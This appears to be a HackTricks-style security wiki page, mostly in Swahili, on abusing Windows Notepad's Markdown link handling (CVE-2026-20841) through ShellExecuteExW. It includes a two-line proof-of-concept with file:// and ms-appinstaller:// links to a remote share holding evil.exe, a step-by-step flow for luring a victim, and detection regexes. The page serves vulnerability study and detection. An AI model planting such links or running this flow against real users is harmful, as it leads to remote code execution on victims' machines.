# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Windows applications zinazofanya render ya Markdown au HTML zinaweza kupeleka targets zilizobofiwa kwa `ShellExecuteExW`. Kwa kuwa ShellExecute huelekeza URI schemes zilizosajiliwa na file associations, renderer inahitaji allowlist iliyo wazi badala ya kudhani kwamba kila link ni HTTP(S). Tabia ya Notepad iliyoelezwa hapa chini inahusu CVE-2026-20841 na haipaswi kutumika kwa ujumla kwa kila renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## Wigo wa ShellExecuteExW katika Windows Notepad Markdown mode
- Notepad huchagua Markdown mode **kwa extensions za `.md` pekee** kupitia fixed string comparison katika `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Markdown links zinazotumika:
- Standard: `[text](target)`
- Autolink: `<target>` (hu-render kama `[target](target)`), kwa hiyo syntax zote mbili ni muhimu kwa payloads na detections.
- Mibofyo ya links huchakatwa katika `sub_140170F60()`, ambayo hufanya filtering dhaifu kisha kuita `ShellExecuteExW`.
- `ShellExecuteExW` huelekeza kwa **protocol handler yoyote iliyosanidiwa**, si HTTP(S) pekee.<sup>[[1]](#references)</sup>

### Mazingatio ya Payload
- Sequence zozote za `\\` katika link **hu-normalize kuwa `\`** kabla ya `ShellExecuteExW`, jambo linaloathiri uundaji na detection ya UNC/path.
- Files za `.md` **hazihusishwi na Notepad kwa default**; victim bado lazima afungue file hilo katika Notepad na abonyeze link, lakini baada ya ku-renderiwa, link inaweza kubofwa.
- Schemes hatari za mfano:<sup>[[1]](#references)</sup>
- `file://` kwa ajili ya kuzindua payload ya local/UNC.
- `ms-appinstaller://` kwa ajili ya kuanzisha App Installer flows. Schemes nyingine zilizosajiliwa locally pia zinaweza kutumiwa vibaya.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Mtiririko wa exploitation
1. Unda **`.md` file** ili Notepad iweze kuionyesha kama Markdown.
2. Pachika link ukitumia URI scheme hatari (`file:`, `ms-appinstaller:`, au handler yoyote iliyosakinishwa).
3. Tuma file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB au inayofanana) na mshawishi mtumiaji kuifungua katika Notepad.
4. Mtumiaji anapobofya, **normalized link** hukabidhiwa kwa `ShellExecuteExW`, na protocol handler inayolingana hutekeleza maudhui yaliyorejelewa katika context ya mtumiaji.<sup>[[1]](#references)[[2]](#references)</sup>

## Mawazo ya Detection
- Fuatilia uhamishaji wa `.md` files kupitia ports/protocols zinazotumika kwa kawaida kuwasilisha documents: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Changanua Markdown links (standard na autolink) na utafute `file:` au `ms-appinstaller:` zisizozingatia **case**.
- Vendor-guided regexes za kunasa ufikiaji wa remote resources:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Marekebisho ya vendor yaliyoelezwa na ZDI yanazuia targets zinazokubaliwa kuwa local files na HTTP(S) pekee. Panua detections kwa protocol handlers nyingine zilizosakinishwa inapohitajika, kwa sababu attack surface iliyosajiliwa hutofautiana kulingana na system.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Utekelezaji wa Arbitrary Code katika Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC ya CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
